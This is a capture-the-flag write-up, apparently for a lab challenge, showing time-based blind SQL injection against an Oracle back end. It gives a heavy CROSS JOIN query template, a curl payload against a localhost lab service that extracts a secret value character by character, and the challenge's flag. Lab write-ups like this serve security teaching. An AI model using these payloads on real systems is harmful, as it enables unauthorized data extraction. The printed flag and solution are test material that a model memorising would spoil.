# SQLi-032: Oracle Heavy Query - Writeup

## Flag: `FLAG{0r4cl3_h34vy_qu3ry}`

## Technique

Oracle không có SLEEP function đơn giản, dùng Heavy Query với CROSS JOIN:

```sql
' AND (SELECT CASE WHEN (condition) THEN (SELECT COUNT(*) FROM all_objects a, all_objects b WHERE ROWNUM<100000) ELSE 1 END FROM dual)>0--
```

## Payload

```bash
time curl "http://localhost:5032/status?id=REQ001' AND (SELECT CASE WHEN SUBSTR((SELECT value FROM secrets WHERE ROWNUM=1),1,1)='F' THEN (SELECT COUNT(*) FROM all_objects a,all_objects b WHERE ROWNUM<50000) ELSE 1 END FROM dual)>0--"
```

🎉 **FLAG:** `FLAG{0r4cl3_h34vy_qu3ry}`
